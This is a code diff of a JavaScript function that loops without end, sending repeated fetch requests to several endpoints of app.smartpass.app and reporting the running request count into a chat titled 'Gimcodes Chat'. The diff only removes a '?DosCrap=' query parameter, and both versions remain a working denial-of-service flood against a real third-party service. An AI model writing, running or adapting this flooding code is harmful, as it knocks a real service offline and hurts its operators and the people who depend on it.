@@ -5,13 +5,13 @@ async function fetchPasses() {
             var x = 0
             while (true) {
                 x+=8
-                fetch("https://app.smartpass.app/main/passes" + "?DosCrap=" + textt);
-                fetch("https://app.smartpass.app/main" + "?DosCrap=" + textt);
-                fetch("https://app.smartpass.app/balls" + "?DosCrap=" + textt);
-                fetch("https://app.smartpass.app/balls1" + "?DosCrap=" + textt);
-                fetch("https://app.smartpass.app/balls2" + "?DosCrap=" + textt);
-                fetch("https://app.smartpass.app/balls3" + "?DosCrap=" + textt);
-                await fetch("https://app.smartpass.app/" + "?DosCrap=" + textt);
+                fetch("https://app.smartpass.app/main/passes");
+                fetch("https://app.smartpass.app/main");
+                fetch("https://app.smartpass.app/balls");
+                fetch("https://app.smartpass.app/balls1");
+                fetch("https://app.smartpass.app/balls2");
+                fetch("https://app.smartpass.app/balls3");
+                await fetch("https://app.smartpass.app/");
                 if (x>100 && document.title == 'Gimcodes Chat'){
                     sendMessage('I have sent ' + x + ' requests to smartpass');
                     x = 0
